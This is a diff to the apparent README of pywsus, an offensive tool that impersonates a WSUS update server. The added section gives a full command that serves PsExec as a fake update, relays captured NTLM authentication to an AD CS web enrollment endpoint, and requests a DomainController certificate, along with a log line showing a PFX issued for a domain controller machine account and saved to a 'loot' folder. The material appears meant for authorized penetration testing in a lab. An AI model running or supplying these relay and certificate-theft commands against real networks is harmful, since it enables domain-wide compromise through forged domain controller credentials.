@@ -66,6 +66,25 @@ python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
   -v
 ```
 
+Domain controller certificate issuance:
+
+```bash
+python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode relay-http \
+  --relay-target http://192.168.56.102/certsrv/ \
+  --relay-action adcs-issue \
+  --adcs-template DomainController \
+  --adcs-loot-dir loot \
+  --json-events issue-adcs-dc.jsonl \
+  -v
+```
+
+Successful signal:
+
+```text
+HTTP relay result  identity=DOMAIN\DC02$ ... authenticated=True validation=type3-and-followup followup=accepted service=adcs-web-enrollment service_validated=True adcs_issued=True cert_id=7 pfx=loot/DOMAIN_DC02.pfx
+```
+
 ## Useful Options
 
 ```text
